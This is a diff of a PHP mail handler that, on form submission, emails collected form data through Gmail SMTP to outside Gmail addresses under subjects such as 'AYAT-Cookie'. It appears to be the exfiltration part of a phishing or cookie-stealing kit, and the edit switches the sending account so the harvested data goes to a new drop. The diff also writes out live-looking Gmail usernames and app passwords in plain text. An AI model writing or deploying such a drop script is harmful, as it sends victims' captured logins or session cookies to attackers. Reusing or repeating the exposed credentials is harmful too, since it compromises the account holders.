@@ -28,14 +28,14 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         $mail->isSMTP();
         $mail->Host       = 'smtp.gmail.com'; // Replace with your SMTP server address
         $mail->SMTPAuth   = true;
-        $mail->Username   = 'bayanicoye@gmail.com'; // Replace with your email address
-        $mail->Password   = 'lapc xkfc tubv uzvy'; // Replace with your email password
+        $mail->Username   = 'hgfver414@gmail.com'; // Replace with your email address
+        $mail->Password   = 'lzgq siya aeus xogl'; // Replace with your email password
         $mail->SMTPSecure = 'tls';
         $mail->Port       = 587;
 
 
         // Email properties
-        $mail->setFrom('bayanicoye@gmail.com', 'PROFESSOR');
+        $mail->setFrom('hgfver414@gmail.com', 'PROFESSOR');
         $mail->addAddress('mahboobalinizamani@gmail.com');
          $mail->addAddress('rnxsxnnxnx@gmail.com');
        
@@ -44,7 +44,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
         // Email content
         $mail->isHTML(true);
-        $mail->Subject = 'shaker-Cookie';
+        $mail->Subject = 'AYAT-Cookie';
         $mail->Body = $emailBody; // Set the email body using the collected form data
         
         // Send email
